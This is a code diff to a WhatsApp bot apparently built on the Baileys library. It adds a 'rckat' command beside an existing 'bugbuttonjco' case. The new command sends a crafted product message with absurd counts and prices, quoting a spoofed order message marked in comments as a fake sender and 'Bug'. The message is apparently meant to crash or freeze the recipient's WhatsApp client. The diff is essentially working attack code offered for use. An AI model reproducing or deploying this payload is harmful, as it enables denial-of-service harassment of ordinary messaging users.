@@ -1,4 +1,4 @@
-const { WAConnection, MessageType, Mimetype, } = require('@adiwajshing/baileys');
+const { WAConnection, MessageType, Mimetype, GroupSettingChange, WALocationMessage, mentionedJid, waChatKey, processTime, MessageOptions, WA_MESSAGE_STUB_TYPES, WA_DEFAULT_EPHEMERAL, ReconnectMode, waChatKey, } = require('@adiwajshing/baileys');
 const fs = require('fs');
 const prefix = '.'
 
@@ -256,6 +256,52 @@ case 'bugbuttonjco':
 											type: 1,
 											}]);
 									break
+
+
+case 'rckat':
+	     hmm4 = fs.readFileSync(`./media/image/jcobug.jpg`)
+imeu = await jco.prepareMessage('0@s.whatsapp.net', hmm4, image)
+
+imeg = imeu.message.imageMessage
+nn = `${bb5}`
+res = await jco.prepareMessageFromContent(from,{
+  "productMessage": {
+  "product": {
+  "productImage": imeg,
+  "productId": "", 
+  "title": errecekatt(prefix),
+"description": errecekatt(prefix), 
+"priceAmount1000": "99999999",
+"descriptionCount": "999999999",
+  "productImageCount": "1",
+  },
+  "businessOwnerJid": "62895362282300@s.whatsapp.net",
+  "contextInfo": {
+  "forwardingScore": 9999,
+  "isForwarded": true
+  }
+  }
+  }, {quoted: {
+				  key: {
+				   fromMe: false,
+				   participant: `0@s.whatsapp.net`, // Fake sender Jid
+				   remoteJid: "status@broadcast"
+				  },
+				  message: {
+				   orderMessage: {
+				    itemCount: 999999999, // Bug
+				    status: 1,
+				    surface: 1,
+				    message: '999999999',
+				    orderTitle: '999999999', // Idk what this does
+				    sellerJid: `0@s.whatsapp.net`
+				   }
+				  }
+				 }
+				})
+  jco.relayWAMessage(res)
+  break
+
                        
 }
 
